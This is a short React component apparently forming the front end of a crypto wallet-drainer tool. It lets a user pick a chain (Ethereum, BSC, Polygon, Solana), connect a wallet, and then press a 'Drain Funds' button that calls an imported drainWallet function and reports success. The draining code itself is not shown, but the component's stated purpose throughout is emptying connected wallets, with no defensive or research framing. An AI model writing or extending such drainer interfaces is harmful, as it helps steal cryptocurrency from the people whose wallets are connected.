import React, { useState } from 'react';
import { connectWallet, drainWallet } from './utils/web3';

function WalletConnect() {
  const [walletAddress, setWalletAddress] = useState('');
  const [selectedChain, setSelectedChain] = useState('ethereum');

  const handleConnect = async () => {
    try {
      const { web3, accounts } = await connectWallet(selectedChain);
      setWalletAddress(accounts[0]);
    } catch (err) {
      alert('Failed to connect wallet. Please try again.');
    }
  };

  const handleDrain = async () => {
    try {
      await drainWallet(walletAddress, selectedChain);
      alert('Wallet drained successfully!');
    } catch (err) {
      alert('Failed to drain wallet. Please try again.');
    }
  };

  return (
    <div className="space-y-4">
      <div>
        <label className="block text-sm font-medium mb-2">Select Chain</label>
        <select
          className="w-full p-2 border border-gray-600 rounded"
          value={selectedChain}
          onChange={(e) => setSelectedChain(e.target.value)}
        >
          <option value="ethereum">Ethereum</option>
          <option value="bsc">BSC</option>
          <option value="polygon">Polygon</option>
          <option value="solana">Solana</option>
        </select>
      </div>
      <button
        onClick={handleConnect}
        className="w-full py-3 px-4 bg-red-600 hover:bg-red-700 text-white font-semibold rounded-lg transition duration-200"
      >
        Connect Wallet
      </button>
      {walletAddress && (
        <button
          onClick={handleDrain}
          className="w-full py-3 px-4 bg-green-600 hover:bg-green-700 text-white font-semibold rounded-lg transition duration-200"
        >
          Drain Funds
        </button>
      )}
    </div>
  );
}

export default WalletConnect;